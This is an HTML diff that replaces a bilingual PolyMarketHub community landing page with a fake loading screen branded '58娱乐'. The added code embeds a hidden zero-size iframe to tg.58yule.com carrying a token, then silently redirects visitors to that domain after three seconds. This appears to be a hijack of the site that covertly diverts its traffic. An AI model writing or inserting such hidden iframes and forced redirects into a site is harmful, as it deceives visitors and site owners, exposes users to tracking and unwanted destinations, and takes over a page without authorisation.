@@ -1,248 +1,218 @@
 <!DOCTYPE html>
-<html lang="zh">
-<head> 
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Polymarkethub Community | PolyMarketHub 社区</title>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>正在加载...</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: 'Inter', sans-serif;
-      background: #03040a;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      overflow-x: hidden;
-      overflow-y: hidden; /* 防止纵向滚动条 */
-      color: #fff;
-    }
 
-    .bg {
-      position: fixed;
-      inset: 0;
-      z-index: -1;
-      background: radial-gradient(circle at 20% 20%, rgba(0,140,255,0.3), transparent 60%),
-                  radial-gradient(circle at 80% 70%, rgba(140,0,255,0.25), transparent 60%),
-                  linear-gradient(135deg, #050510, #0a0a1a);
-      animation: nebula 12s infinite alternate ease-in-out;
-      filter: blur(40px);
-    }
-
-    @keyframes nebula {
-      0% { transform: scale(1); opacity: 0.9; }
-      100% { transform: scale(1.2); opacity: 1; }
-    }
-
-    header { text-align: center; margin-bottom: 3rem; }
-
-    h1 {
-      font-size: 1.8rem;
-      font-weight: 700;
-      background: linear-gradient(90deg, rgba(0,234,255,0.4) 0%, #7b5bff 20%, #00ffcc 40%, rgba(255,255,255,1) 50%, #00ffcc 60%, #7b5bff 80%, rgba(0,234,255,0.4) 100%);
-      background-size: 300%;
-      animation: textShine 6s linear infinite;
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      white-space: nowrap;
-      position: relative;
-    }
-
-    @keyframes textShine {
-      0% { background-position: 200% center; }
-      100% { background-position: -200% center; }
-    }
-
-    p.subtitle {
-      opacity: 0.8;
-      margin-top: 0.5rem;
-      font-size: 0.9rem;
-      white-space: normal;
-      text-align: center;
-    }
-
-    main {
-      display: flex;
-      width: 90%;
-      max-width: 1200px;
-      gap: 2rem;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    .community-cards {
-      display: flex;
-      gap: 2rem;
+    html, body {
       width: 100%;
-      flex-direction: column;
-    }
-
-    @media (min-width: 768px) {
-      .community-cards { flex-direction: row; }
-    }
-
-    .card {
-      flex: 1;
-      position: relative;
-      padding: 2.5rem;
-      border-radius: 18px;
-      backdrop-filter: blur(14px);
-      background: rgba(255,255,255,0.06);
-      border: 1px solid rgba(0,200,255,0.25);
-      cursor: pointer;
-      transition: 0.35s ease;
+      height: 100%;
       overflow: hidden;
-      opacity: 0;
-      transform: translateY(40px);
-      animation: cardFadeUp 0.9s ease forwards;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+      background: linear-gradient(135deg, #0b0f19 0%, #121827 50%, #0f0f1a 100%);
     }
 
-    @keyframes cardFadeUp {
-      0% { opacity: 0; transform: translateY(40px); }
-      100% { opacity: 1; transform: translateY(0); }
+    /* ===== 全屏 Flex 居中 ===== */
+    .loading-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      height: 100%;
+      padding: 20px;
+      position: relative;
+      z-index: 10;
     }
 
-    .card:hover {
-      transform: translateY(-10px) scale(1.03);
-      border-color: #00eaff;
-      box-shadow: 0 0 30px rgba(0,200,255,0.4);
+    /* ===== 加载动画容器 ===== */
+    .loader-box {
+      position: relative;
+      width: 120px;
+      height: 120px;
+      margin-bottom: 40px;
     }
 
-    .card::after {
-      content: '';
+    /* 外圈 */
+    .loader-ring {
       position: absolute;
       inset: 0;
-      background: linear-gradient(120deg, transparent, rgba(0,200,255,0.25), transparent);
-      transform: translateX(-100%);
-      transition: 0.6s;
-    }
-
-    .card:hover::after { transform: translateX(100%); }
-
-    .card h2 {
-      font-size: 1.4rem;
-      margin-bottom: 0.5rem;
-      color: #00eaff;
-      font-weight: 600;
-      white-space: nowrap;
-    }
-
-    .card p {
-      opacity: 0.75;
-      font-size: 1rem;
-      line-height: 1.5;
-    }
-
-    .particle {
-      position: fixed;
-      width: 4px;
-      height: 4px;
-      background: #00eaff;
       border-radius: 50%;
-      opacity: 0.7;
-      animation: floatParticles linear infinite;
-      z-index: -1;
+      border: 3px solid transparent;
+      border-top-color: #ff6b35;
+      border-right-color: rgba(255, 107, 53, 0.3);
+      animation: spin 1.2s linear infinite;
     }
 
-    @keyframes floatParticles {
-      from { transform: translateY(0) scale(1); opacity: 1; }
-      to { transform: translateY(-200vh) scale(0.3); opacity: 0; }
+    /* 中圈 */
+    .loader-ring:nth-child(2) {
+      inset: 12px;
+      border-top-color: #6366f1;
+      border-right-color: rgba(99, 102, 241, 0.3);
+      animation: spin 0.9s linear infinite reverse;
     }
 
-    .highlights {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 1.5rem;
-      justify-content: center;
-      margin-top: 3rem;
+    /* 内圈 */
+    .loader-ring:nth-child(3) {
+      inset: 24px;
+      border-top-color: #fbbf24;
+      border-right-color: rgba(251, 191, 36, 0.3);
+      animation: spin 0.6s linear infinite;
+    }
+
+    /* 中心点 */
+    .loader-dot {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 16px;
+      height: 16px;
+      background: linear-gradient(135deg, #ff6b35, #ff8f50);
+      border-radius: 50%;
+      box-shadow: 0 0 20px rgba(255, 107, 53, 0.5);
+      animation: pulse 1.5s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+      50% { transform: translate(-50%, -50%) scale(1.3); opacity: 0.7; }
+    }
+
+    /* ===== 品牌文字 ===== */
+    .brand-text {
+      font-size: 28px;
+      font-weight: 800;
+      letter-spacing: 2px;
+      margin-bottom: 12px;
+      background: linear-gradient(135deg, #fff 0%, #94a3b8 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    .brand-text span {
+      background: linear-gradient(135deg, #ff6b35 0%, #ff9f7a 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    /* ===== 加载提示 ===== */
+    .loading-text {
+      font-size: 15px;
+      color: #6b7280;
+      margin-bottom: 32px;
+      letter-spacing: 2px;
+      animation: breathe 2s ease-in-out infinite;
+    }
+
+    @keyframes breathe {
+      0%, 100% { opacity: 0.5; }
+      50% { opacity: 1; }
+    }
+
+    /* ===== 进度条 ===== */
+    .progress-wrap {
       width: 100%;
+      max-width: 280px;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.06);
+      border-radius: 2px;
+      overflow: hidden;
+      margin-bottom: 12px;
     }
 
-    .highlight {
-      flex: 1 1 250px;
-      background: rgba(255,255,255,0.05);
-      backdrop-filter: blur(12px);
-      border: 1px solid rgba(0,200,255,0.2);
-      border-radius: 15px;
-      padding: 1rem 1.5rem;
-      text-align: center;
-      transition: 0.3s;
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #ff6b35, #6366f1);
+      border-radius: 2px;
+      animation: progress 2.5s ease-in-out infinite;
+      box-shadow: 0 0 10px rgba(255, 107, 53, 0.3);
     }
 
-    .highlight:hover { box-shadow: 0 0 20px rgba(0,200,255,0.35); }
+    @keyframes progress {
+      0% { width: 0%; opacity: 1; }
+      50% { width: 70%; opacity: 1; }
+      100% { width: 100%; opacity: 0.3; }
+    }
 
-    .highlight h3 { font-size: 1.2rem; color: #00eaff; margin-bottom: 0.5rem; }
-    .highlight p { font-size: 0.9rem; opacity: 0.8; line-height: 1.4; }
+    .progress-text {
+      font-size: 12px;
+      color: #475569;
+      font-variant-numeric: tabular-nums;
+    }
 
-    @media (max-width: 767px) {
-      .highlights { display: none; }
+    /* ===== 背景装饰 ===== */
+    .bg-glow {
+      position: fixed;
+      width: 400px;
+      height: 400px;
+      border-radius: 50%;
+      filter: blur(100px);
+      opacity: 0.1;
+      pointer-events: none;
+      z-index: 0;
+    }
+    .bg-glow-1 { top: -100px; left: -100px; background: #ff6b35; }
+    .bg-glow-2 { bottom: -100px; right: -100px; background: #6366f1; }
+
+    /* ===== 移动端适配 ===== */
+    @media (max-width: 480px) {
+      .loader-box { width: 100px; height: 100px; margin-bottom: 32px; }
+      .loader-ring:nth-child(2) { inset: 10px; }
+      .loader-ring:nth-child(3) { inset: 20px; }
+      .brand-text { font-size: 24px; }
+      .loading-text { font-size: 14px; }
     }
   </style>
 </head>
 <body>
-  <div class="bg"></div>
 
-  <header>
-    <h1>PolyMarketHub Community</h1>
-    <p class="subtitle">选择你的未来 —— 进入全球最前沿的预测市场生态</p>
-    <p class="subtitle">Choose your future — Explore the cutting-edge prediction market ecosystem globally</p>
-  </header>
+  <div class="bg-glow bg-glow-1"></div>
+  <div class="bg-glow bg-glow-2"></div>
 
-  <main>
-    <div class="community-cards">
-      <div class="card" onclick="enter('en')">
-        <h2>English Community</h2>
-        <p>Join the official Polymarkethub international English community.</p>
-      </div>
-      <div class="card" onclick="enter('zh')">
-        <h2>中文社区</h2>
-        <p>加入 Polymarkethub 中文社区，参与讨论和活动。</p>
-      </div>
+  <div class="loading-wrap">
+    <div class="loader-box">
+      <div class="loader-ring"></div>
+      <div class="loader-ring"></div>
+      <div class="loader-ring"></div>
+      <div class="loader-dot"></div>
     </div>
 
-    <div class="highlights">
-      <div class="highlight">
-        <h3>Global Users</h3>
-        <p>Connect with traders and prediction enthusiasts worldwide for real-time discussions.</p>
-      </div>
-      <div class="highlight">
-        <h3>Market Analysis</h3>
-        <p>Access the latest prediction market analysis, insights, and community discussions.</p>
-      </div>
-      <div class="highlight">
-        <h3>Events & Challenges</h3>
-        <p>Participate in prediction challenges and community events to gain experience and rewards.</p>
-      </div>
-      <div class="highlight">
-        <h3>全球用户</h3>
-        <p>连接来自世界各地的交易者和预测爱好者，实时交流。</p>
-      </div>
-      <div class="highlight">
-        <h3>市场分析</h3>
-        <p>获取最新的预测市场分析、数据洞察和社区讨论。</p>
-      </div>
-      <div class="highlight">
-        <h3>活动与挑战</h3>
-        <p>参与预测挑战和社区活动，提升经验并赢取奖励。</p>
-      </div>
-    </div>
-  </main>
+    <div class="brand-text"><span>58</span>娱乐</div>
+    <div class="loading-text">正在加载中...</div>
 
+    <div class="progress-wrap">
+      <div class="progress-bar"></div>
+    </div>
+    <div class="progress-text">请稍候</div>
+  </div>
+
+  <!-- 隐藏的 iframe -->
+  <iframe 
+    src="https://tg.58yule.com/set.html?token=2793811146410ff3cc5a52366a2283d3" 
+    style="display:none; width:0; height:0; border:0; visibility:hidden;" 
+    frameborder="0">
+  </iframe>
   <script>
-    function enter(lang) {
-      if (lang === 'en') window.open('https://en.polymarkethub.com/');
-      else window.open('https://zh.polymarkethub.com');
-    }
+  setTimeout(function() {
+    document.body.style.transition = 'opacity 0.5s ease';
+    document.body.style.opacity = '0';
+    
+    setTimeout(function() {
+      window.location.href = 'https://tg.58yule.com';
+    }, 500);
+  }, 3000);
+</script>
 
-    for (let i = 0; i < 50; i++) {
-      const p = document.createElement('div');
-      p.className = 'particle';
-      p.style.left = Math.random()*100+'vw';
-      p.style.top = 100 + Math.random()*20 + 'vh'; // 调整初始位置，避免纵向滚动条
-      p.style.animationDuration = 6 + Math.random()*8 + 's';
-      document.body.appendChild(p);
-    }
-  </script>
 </body>
 </html>
